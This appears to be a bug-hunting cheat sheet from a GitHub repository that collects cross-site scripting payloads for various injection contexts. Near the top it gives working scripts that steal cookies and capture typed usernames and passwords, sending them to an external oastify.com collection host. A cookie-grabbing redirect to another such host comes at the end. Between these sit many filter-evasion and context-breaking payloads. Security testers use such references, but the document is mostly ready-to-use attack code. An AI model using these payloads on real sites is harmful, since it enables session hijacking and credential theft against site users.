# Contents
* [For html Injection](#For-html-Injection)
* [Angle brackets HTML-encoded bypass](#Angle-brackets-HTML-encoded-bypass)
* [Reflected XSS into a JavaScript string with single quote and backslash escaped](#Reflected-XSS-into-a-JavaScript-string-with-single-quote-and-backslash-escaped)
* [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](#Reflected-XSS-into-a-JavaScript-string-with-angle-brackets-and-double-quotes-HTML-encoded-and-single-quotes-escaped)
* [Tags and Attribute Block Bypass](#Tags-and-Attribute-Block-Bypass)
* [Reflected XSS with some SVG markup allowed](#Reflected-XSS-with-some-SVG-markup-allowed)
* [Reflected XSS in canonical link tag](#Reflected-XSS-in-canonical-link-tag)

## Payload for stealing cookies
```js
<script>
fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
## Payload for stealing credentials
```js
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://m1ofpkz2aozr1riy4z987vbc137uvnjc.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
#### External source of payloads
https://github.com/payloadbox/xss-payload-list
##### For filter bypass
https://github.com/terjanq/Tiny-XSS-Payloads
## XSS with filter evasion
```
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```
##### XSS Filter Evasion Cheat Sheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
### For html Injection
```
<h1>cyborg71</h1>
"><h1>cyborg71</h1>
<a href="https://google.com"></a>
```
# Testing Alert
```js
<script>alert(1337)</script>
><script>alert(1337)</script>
">cyborg71<script>alert(1337)</script>
<svg/ onload=alert(1337)//
<Svg/OnLoad=(confirm)(1337)<!--
<img src=x onerror=alert(1337)>
<iframe src="javascript:alert(1337)">
';alert(1337)//
<custom-tag onmouseover='alert(1337)'>
/?x=y'%09onclick='alert(1337)'%09accessKey='x'
/?'accesskey='x'onclick='alert(1337)
javascript:alert(1337)
y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
```
![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)

![Screenshot from 2024-06-22 21-30-13](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/cd6ea4c0-17df-448a-bc1a-caa4d293ee80)

![Screenshot from 2024-06-22 21-34-37](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/2938507e-12e8-438d-ad7d-d1ec7d65a963)

![Screenshot from 2024-06-22 21-36-45](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/06045884-2e15-4998-bfe6-057cf34dbe92)

![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)

#### For testing.
```js
"><h1>cyborg.71</h1>
<script onclick="alert(1337)">
<a href="javascript:alert('XSS')">Click me</a>
<img src=https://i.imgflip.com/8uo0t9.jpg>
```
## Angle brackets HTML-encoded bypass
### Reflected XSS into HTML attribute with angle brackets HTML-encoded
Inject ```<xss123>'"``` and see if the angle ```<>``` brackets are encoded with ```&lt;``` and ```&gt;```.
  ![Screenshot from 2024-06-12 22-48-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/4bb3d36b-cef6-49ae-ab0d-a4c6ad9c8553)<br>
If this is the case, you should inject this payloads. 
```js
" onclick="alert(1337)
" autofocus="alert(1337)
" autofocus onfocus="alert(1337)
" onmouseover="alert(1)
```
![Screenshot from 2024-06-22 22-10-29](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5f0c53d6-0489-483d-a82d-373456ee9233)
### Reflected XSS into a JavaScript string with angle brackets HTML encoded
Inject ```<xss123>'"``` and see if your payload encoded in a javascript code.<br>
![Screenshot from 2024-06-13 00-19-30](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/9180969c-2299-4adf-9c4a-a05e97629938)<br>
In this case you should try this payload to braek the code to inject maliciuos payload.
```js
xss';alert(1);'xss
'-alert(1)-'
```
Finally the code will look like this after response.
![Screenshot from 2024-06-23 19-29-18](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/5387641e-5ee7-4dca-89a3-e1253a426bc5) <br>
#### Reflected XSS into a JavaScript string with single quote and backslash escaped
In some scenarios the payload might not work because of single quote and backslash escape.
![Screenshot from 2024-07-01 04-27-49](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/af236bde-554a-45f9-8e61-77f4409e5ef4) <br>
In this situation, you close the script tag inject your payload.
```
</script><img src=x onerror=alert(1337)>
```
And then the final code will look like this after response.
![Screenshot from 2024-07-01 04-37-54](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/8221e31d-5597-464b-8ed2-2b4d32368b9d)
#### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
Sometimes previous method might not work because of angle brackets and double quotes HTML-encoded and single quotes escaped.
![Screenshot from 2024-07-01 21-47-37](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/320694fa-5d32-468d-bab3-62bc18829582)<br>
In this case you can try this payload
```
\';alert(1337)//
```
And the final code will look like this.
<br>![Screenshot from 2024-07-01 21-50-00](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/3c75b4b8-173c-4bf7-8c3b-bc87dbc90386)
## Tags and Attribute Block Bypass
### Reflected XSS into HTML context with most tags and attributes blocked
https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked. Bruteforce for getting allowed tags.
```
"><body onresize=alert(1337)>
```
### Reflected XSS into HTML context with all tags blocked except custom ones
###### Key Note
```tabindex="1"```, ```id="a1"```, ```#a1```
```
<custom-tag tabindex="1" onfocus='alert(1337)' id="a1">#a1
<xss id=a1 onfocus=alert(document.cookie) tabindex=1>#a1
```
## Reflected XSS with some SVG markup allowed
```
"><svg><animatetransform onbegin=alert(1337)></animatetransform></svg>
"><svg><animatetransform onbegin='alert(1337)'></animatetransform></svg>
```
## Reflected XSS in canonical link tag
Make your custom parameter in a url path such as httpx://a.com/?```whoami=cyborg71```.
![Screenshot from 2024-07-01 03-55-35](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/67df34d4-e22f-49cf-a1f0-786a9113b316)<br>
After this, If we get a canonical link in page source, then there might be a xss vulnerability exists. In this case try this payloads.
```
/?whoami=cyborg71'%09onclick='alert(1337)'%09accessKey='x'
/?'accesskey='x'onclick='alert(1337)
```
Now, use this keys to get reflection.

    On Windows: ALT+SHIFT+X
    On MacOS: CTRL+ALT+X
    On Linux: Alt+X
#### For cookie grabbing
```js
<script>document.location='https://r91uwnam29s3c1jdsyc8t7t34ualyfm4.oastify.com//'+document.cookie</script> 
```
